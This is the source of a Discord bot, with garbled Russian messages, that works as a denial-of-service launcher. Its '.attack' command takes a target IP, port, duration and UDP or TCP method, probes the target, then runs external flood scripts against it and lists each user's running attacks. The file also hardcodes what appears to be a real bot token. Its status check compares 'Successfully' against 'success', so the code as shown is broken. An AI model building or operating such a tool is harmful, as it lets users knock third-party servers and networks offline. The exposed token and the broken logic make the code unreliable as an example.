import discord
from discord.ext import commands, tasks
import socket
import asyncio
import os
import subprocess
import sys

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

active_attacks = {}
ip_blacklist = set()

def load_ip_blacklist():
    if os.path.exists("IPban.txt"):
        with open("IPban.txt", "r") as file:
            for line in file:
                ip_blacklist.add(line.strip())
load_ip_blacklist()

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="–ü–æ–º–æ—â—å", description=".help - –ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥.\n.methods - –£–∑–Ω–∞—Ç—å –æ –º–µ—Ç–æ–¥–∞—Ö –∞—Ç–∞–∫.", color=discord.Color.red())
    await ctx.reply(embed=embed)

@bot.command()
async def methods(ctx):
    embed = discord.Embed(title="–ú–µ—Ç–æ–¥—ã –∞—Ç–∞–∫:", description="L4 –º–µ—Ç–æ–¥—ã:\n- udp\n- tcp", color=discord.Color.purple())
    await ctx.reply(embed=embed)

@bot.command()
async def attack(ctx, ip: str = None, port: int = None, seconds: int = None, method: str = 'udp'):
    if ip is None or port is None or seconds is None:
        embed = discord.Embed(title="–û—à–∏–±–∫–∞", description="–ü—Ä–∞–≤–∏–ª—å–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: .attack (–∞–π–ø–∏) (–ø–æ—Ä—Ç) (—Å–µ–∫—É–Ω–¥—ã) (–º–µ—Ç–æ–¥)", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if ip in ip_blacklist:
        embed = discord.Embed(title="–û—à–∏–±–∫–∞", description="–≠—Ç–æ—Ç –∞–π–ø–∏/–¥–æ–º–µ–Ω/—Å–∞–π—Ç –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ BlackList.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if not is_valid_ip(ip):
        embed = discord.Embed(title="–û—à–∏–±–∫–∞", description="–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∞–π–ø–∏. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –æ–Ω –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if not (0 < port < 65536):
        embed = discord.Embed(title="–û—à–∏–±–∫–∞", description="–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø–æ—Ä—Ç. –ü–æ—Ä—Ç –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤ –¥–∏–∞–ø–∞–∑–æ–Ω–µ –æ—Ç 1 –¥–æ 65535.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if seconds is None or seconds <= 0 or not isinstance(seconds, int):
        embed = discord.Embed(title="–û—à–∏–±–∫–∞", description="–í—ã –Ω–∞–ø–∏—Å–∞–ª–∏ –Ω–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å–µ–∫—É–Ω–¥—ã. –î–æ–ª–∂–Ω–æ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    if method.lower() not in ['udp', 'tcp']:
        embed = discord.Embed(title="–û—à–∏–±–∫–∞", description="–í—ã –Ω–∞–ø–∏—Å–∞–ª–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –º–µ—Ç–æ–¥ –∞—Ç–∞–∫–∏, –Ω–∞–ø–∏—à–∏—Ç–µ .methods –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –º–µ—Ç–æ–¥–æ–≤.", color=discord.Color.red())
        await ctx.reply(embed=embed)
        return

    api_status = await check_api_status(ip, port, method)
    if api_status != 'success':
        embed = discord.Embed(
            title="–û—à–∏–±–∫–∞ API",
            description=f"üåê | –ê–π–ø–∏: {ip}\n‚öì | –ü–æ—Ä—Ç: {port}\n‚è≥ | –°–µ–∫—É–Ω–¥—ã –∞—Ç–∞–∫–∏: {seconds}\nüìö | –ú–µ—Ç–æ–¥: {method.upper()}\n\n–°—Ç–∞—Ç—É—Å API:\nFurySquadApi: :x: {api_status}",
            color=discord.Color.red()
        )
        await ctx.reply(embed=embed)
        return

    attack_id = f"{ctx.author.id}_{len(active_attacks) + 1}"
    active_attacks[attack_id] = {'ip': ip, 'port': port, 'seconds': seconds, 'method': method}

    embed = discord.Embed(
        title="–ê—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞",
        description=f"üåê | –ê–π–ø–∏: {ip}\n‚öì | –ü–æ—Ä—Ç: {port}\n‚è≥ | –°–µ–∫—É–Ω–¥—ã –∞—Ç–∞–∫–∏: {seconds}\nüìö | –ú–µ—Ç–æ–¥: {method.upper()}",
        color=discord.Color.purple()
    )
    msg = await ctx.reply(embed=embed)

    await run_attack(ip, port, seconds, attack_id, method, ctx)

@bot.command()
async def activeattacks(ctx):
    embed = discord.Embed(title="–ê–∫—Ç–∏–≤–Ω—ã–µ –∞—Ç–∞–∫–∏:", color=discord.Color.purple())

    if not active_attacks:
        embed.description = "–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –∞—Ç–∞–∫."
        await ctx.reply(embed=embed)
        return

    for attack_id, attack in list(active_attacks.items()):
        user = await bot.fetch_user(int(attack_id.split('_')[0]))
        if attack['seconds'] > 0:
            embed.add_field(
                name=f"–ò–≥—Ä–æ–∫: {user.name} (ID: {user.id})",
                value=f"–ú–µ—Ç–æ–¥: {attack['method'].upper()}\n–û—Å—Ç–∞–ª–æ—Å—å —Å–µ–∫—É–Ω–¥: {attack['seconds']}",
                inline=False
            )
        else:
            del active_attacks[attack_id]

    await ctx.reply(embed=embed)

@tasks.loop(seconds=1)
async def update_active_attacks():
    for attack_id in list(active_attacks.keys()):
        active_attacks[attack_id]['seconds'] -= 1
        if active_attacks[attack_id]['seconds'] <= 0:
            del active_attacks[attack_id]

@bot.event
async def on_ready():
    update_active_attacks.start()

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not (0 <= int(part) < 256):
            return False
    return True

async def run_attack(ip, port, seconds, attack_id, method, ctx):
    try:
        process = await asyncio.create_subprocess_exec(
            sys.executable, f'methods/l4/{method}.py', ip, str(port), str(seconds),
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        embed = discord.Embed(
            title="–ê—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞",
            description=(f"üåê | –ê–π–ø–∏: {ip}\n‚öì | –ü–æ—Ä—Ç: {port}\n‚è≥ | –°–µ–∫—É–Ω–¥—ã –∞—Ç–∞–∫–∏: {seconds}\nüìö | –ú–µ—Ç–æ–¥: {method.upper()}"),
            color=discord.Color.purple()
        )

        await ctx.send(embed=embed)

        print(f"[INFO] –ê—Ç–∞–∫–∞ –Ω–∞ {ip}:{port} –∑–∞–ø—É—â–µ–Ω–∞ –Ω–∞ {seconds} —Å–µ–∫—É–Ω–¥(—ã) —Å –º–µ—Ç–æ–¥–æ–º {method.upper()}.")

        stdout, stderr = await process.communicate()
        if stdout:
            print(f"–í—ã–≤–æ–¥: {stdout.decode()}")
        if stderr:
            error_message = stderr.decode()
            await ctx.send(f":x: –û—à–∏–±–∫–∞: {error_message}")
    except Exception as e:
        await ctx.send(f":x: –û—à–∏–±–∫–∞: {e}")
        print(f"[ERROR] –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –∞—Ç–∞–∫–∏: {e}")

async def check_api_status(ip, port, method):
    try:
        sock = socket.create_connection((ip, port), timeout=5)
        sock.close()
        
        return 'Successfully'

    except Exception as e:
        return f"{str(e)}"

bot.run("MTI4MjEwMDI2MTc0NTIwMTE2Mw.GXsdyS.1z8vE1iTufXiZB9JU-JZ8f2G9qRg_AQ8DM9Q-U")